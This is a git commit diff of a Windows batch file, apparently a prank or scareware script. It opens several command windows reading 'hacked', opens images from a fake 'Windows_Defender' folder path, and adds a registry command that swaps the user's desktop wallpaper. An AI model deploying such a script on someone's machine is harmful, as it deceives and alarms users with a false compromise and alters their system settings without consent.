a638d59fe8d277c7e40723b8188722b469cff0fc
huckardidi <124454617+huckardidi@users.noreply.github.com>
2024-11-23 13:47:52 +0530

    Update Windows_System.bat

--- Windows_System.bat
+++ Windows_System.bat
@@ -1,7 +1,10 @@
 START CMD /C "ECHO hacked && PAUSE"
 START CMD /C "ECHO hacked && PAUSE"
 START CMD /C "ECHO hacked && PAUSE"
+
 C:\Windows_Defender\temp\cache\temp\1.gif
 C:\Windows_Defender\temp\cache\temp\2.gif
-C:\Windows_Defender\temp\cache\temp\3.gif
-C:\Windows_Defender\temp\cache\temp\4.png
+C:\Windows_Defender\temp\cache\temp\3.jpg
+
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows_Defender\temp\cache\temp\3.jpg" /f
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
